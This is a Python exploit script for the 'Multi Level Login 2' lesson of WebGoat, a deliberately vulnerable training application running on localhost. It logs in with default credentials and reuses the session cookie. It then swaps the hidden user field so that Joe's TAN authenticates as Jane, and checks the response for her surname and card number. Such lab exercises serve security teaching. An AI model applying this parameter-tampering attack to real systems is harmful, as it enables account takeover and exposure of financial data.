#!/usr/bin/python

'''
attack.py 

exploits the Multi Level Login 2 WebGoat vulnerability
'''

import requests
import re

# authenticate with webgoat
r = requests.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check', data={'username':'webgoat', 'password':'webgoat'})

# grab session cookie
cookies = {'JSESSIONID': r.cookies['JSESSIONID']}

# request the lesson menu
r = requests.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc', cookies=cookies)

# find vulnerable url screen id
m = re.search("Multi Level Login 2', u'showHints': True, u'link': u'attack\?Screen=(\d+)", str(r.json))
vuln_id =  m.group(1)
vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen={id}&menu=500'.format(id=vuln_id)

# authenticate at the first level as Joe:banana
v = requests.post(vuln_url, 
                  data={'user2':'Joe', 'pass2':'banana'}, 
                  cookies=cookies)

# try to authenticate at second level as Jane but using Joe's TAN

x = requests.post(vuln_url,
                  data={'hidden_user': 'Jane', 'tan2': 15161, 'Submit': 'Submit'},
                  cookies=cookies)

# Search for Janes last name and CCN
surname = re.search("Plane", x.text)
ccn = re.search("74589864", x.text)

if surname and ccn:
  print("Attack Successful.")
